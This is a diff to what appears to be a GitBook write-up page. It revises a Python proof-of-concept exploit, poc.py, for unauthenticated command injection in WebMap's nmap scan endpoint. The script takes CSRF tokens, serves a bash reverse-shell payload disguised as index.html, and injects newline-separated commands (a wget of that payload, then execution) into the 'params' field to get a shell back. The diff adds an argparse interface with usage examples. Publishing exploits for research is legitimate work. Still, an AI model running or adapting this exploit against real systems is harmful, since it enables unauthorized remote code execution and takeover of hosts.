@@ -285,6 +285,19 @@ This limits access to the local machine and significantly cuts the attack surfac
 {% code title="poc.py" %}
 ```py
 #!/usr/bin/env python3
+"""
+WebMap (SabyasachiRana/webmap) unauthenticated RCE PoC
+--------------------------------------------------------
+This PoC:
+  1. Spins up a local HTTP server to host a 
+     bash reverse-shell one-liner disguised as index.html.
+  2. Grabs a CSRF token/cookie pair from the target's login page
+  3. Submits a crafted 'params' value that gets concatenated into
+     the nmap command line, causing it to wget the payload and execute it via bash.
+
+Author: CalledSTRIKER
+"""
+import argparse
 import re
 import sys
 import time
@@ -293,6 +306,7 @@ import requests
 import tempfile
 import os
 from http.server import HTTPServer, SimpleHTTPRequestHandler
+
 
 def get_csrf_tokens(ip: str, port: str) -> tuple[str, str, requests.Session]:
     url = f"http://{ip}:{port}/view/login/"
@@ -310,6 +324,7 @@ def get_csrf_tokens(ip: str, port: str) -> tuple[str, str, requests.Session]:
     csrf_token = match.group(1)
     return csrf_cookie, csrf_token, session
 
+
 def start_http_server(ip: str, port: int, serve_dir: str) -> HTTPServer:
     class Handler(SimpleHTTPRequestHandler):
         def __init__(self, *args, **kwargs):
@@ -321,15 +336,81 @@ def start_http_server(ip: str, port: int, serve_dir: str) -> HTTPServer:
     thread.start()
     return server
 
-def main():
-    if len(sys.argv) != 7:
-        print(f"Usage: {sys.argv[0]} <target_ip> <target_port> "
-              "<http_server_ip> <http_server_port> <revshell_ip> <revshell_port>")
-        sys.exit(1)
 
-    target_ip, target_port = sys.argv[1], sys.argv[2]
-    http_server_ip, http_server_port = sys.argv[3], int(sys.argv[4])
-    revshell_ip, revshell_port = sys.argv[5], sys.argv[6]
+def build_arg_parser() -> argparse.ArgumentParser:
+    parser = argparse.ArgumentParser(
+        prog="webmap_exploit.py",
+        description=(
+            "PoC for an unauthenticated command injection / RCE in WebMap's "
+            "/api/v1/nmap/scan/new endpoint. Hosts a payload over HTTP, then "
+            "tricks the target's nmap scan into downloading and executing it."
+        ),
+        epilog=(
+            "Example:\n"
+            "  python3 webmap_exploit.py --target-ip 10.10.10.5 --target-port 80 \\\n"
+            "      --http-server-ip 10.10.14.2 --http-server-port 8000 \\\n"
+            "      --revshell-ip 10.10.14.2 --revshell-port 4444\n\n"
+            "This targets WebMap at 10.10.10.5:80, serves the payload from\n"
+            "10.10.14.2:8000, and calls back a reverse shell to 10.10.14.2:4444.\n"
+            "Start a listener first."
+        ),
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+
+    parser.add_argument(
+        "-t", "--target-ip",
+        dest="target_ip",
+        required=True,
+        help="IP address of the vulnerable WebMap instance.",
+    )
+    parser.add_argument(
+        "-p", "--target-port",
+        dest="target_port",
+        required=True,
+        help="TCP port WebMap is listening on (commonly 8000).",
+    )
+    parser.add_argument(
+        "-H", "--http-server-ip",
+        dest="http_server_ip",
+        required=True,
+        help=(
+            "IP address to bind the local HTTP server to. This is the address "
+            "the target will reach out to when it wgets the payload"
+        ),
+    )
+    parser.add_argument(
+        "-P", "--http-server-port",
+        dest="http_server_port",
+        type=int,
+        required=True,
+        help="Port to bind the local HTTP server to.",
+    )
+    parser.add_argument(
+        "-r", "--revshell-ip",
+        dest="revshell_ip",
+        required=True,
+        help=(
+            "IP address the reverse shell should connect back to. Usually the "
+            "same as http_server_ip."
+        ),
+    )
+    parser.add_argument(
+        "-l", "--revshell-port",
+        dest="revshell_port",
+        required=True,
+        help="Port your netcat listener is bound to.",
+    )
+
+    return parser
+
+
+def main():
+    parser = build_arg_parser()
+    args = parser.parse_args()
+
+    target_ip, target_port = args.target_ip, args.target_port
+    http_server_ip, http_server_port = args.http_server_ip, args.http_server_port
+    revshell_ip, revshell_port = args.revshell_ip, args.revshell_port
 
     tmpdir = tempfile.mkdtemp(prefix="webmap_exploit_")
     shell_path = os.path.join(tmpdir, "index.html")
@@ -352,7 +433,7 @@ def main():
         print(f"[+] csrftoken cookie: {csrf_cookie}")
         print(f"[+] csrfmiddlewaretoken: {csrf_token}")
 
-        download_url = f"{http_server_ip}:{http_server_port}" # without http:// because slashes are blocked
+        download_url = f"{http_server_ip}:{http_server_port}"  # without http:// because slashes are blocked
         params_payload = (
             "-oA a\n"
             f"wget -O shell.sh {download_url}\n"
@@ -395,6 +476,7 @@ def main():
             os.remove(shell_path)
             os.rmdir(tmpdir)
             print("[+] Clean up complete. Exiting.")
+
 
 if __name__ == "__main__":
     main()
